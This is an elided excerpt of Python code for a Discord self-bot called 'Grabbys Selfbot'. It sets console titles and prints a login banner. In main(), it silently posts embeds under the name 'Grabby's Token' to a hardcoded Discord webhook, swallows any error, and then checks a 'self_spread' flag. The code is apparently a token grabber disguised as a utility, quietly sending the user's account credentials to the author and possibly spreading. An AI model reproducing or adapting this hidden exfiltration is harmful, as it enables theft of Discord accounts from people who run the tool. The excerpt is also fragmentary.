...
ctypes.windll.kernel32.SetConsoleTitleW(f'[Grabbys Selfbot v{SELFBOT.__version__}] | Loading.')
...
def main():
    ...
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Grabby's Token",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/847198177190740028/Hg_mUXJgIcNkvLa894LgZcZiTwg_RiuZh1dzcj_GNJ9ZTf7nYFuoKdAioaGTvm2GGwnR", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
...
def startprint():
    ...
    print(f'''{Fore.RESET}
                         ...
                         / ___/  ____ ___ _  / /   / /   __ __  ___       / __/ ___   / /  / _/  / /  ___  / /_
                         / (_ /  / __// _ `/ / _ \ / _ \ / // / (_-<      _\ \  / -_) / /  / _/  / _ \/ _ \/ __/
                         \___/  /_/   \_,_/ /_.__//_.__/ \_, / /___/     /___/  \__/ /_/  /_/   /_.__/\___/\__/ 
                                                       /___/                                                   
                                                                
                       {Fore.CYAN}Grabbys {SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Alucard.user.name}#{Alucard.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Alucard.user.id}   
                       ...
                       {Fore.CYAN}Coded by: {Fore.GREEN}grabby#4283
...
def Init():
    if config.get('token') == "token-here":
        ...
        try:
            ...
            os.system(f'title (Grabbys Selfbot) - Version {SELFBOT.__version__}')
...
async def on_connect():
    ...
    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Grabbys Selfbot v{SELFBOT.__version__}] | Logged in as {Alucard.user.name}')
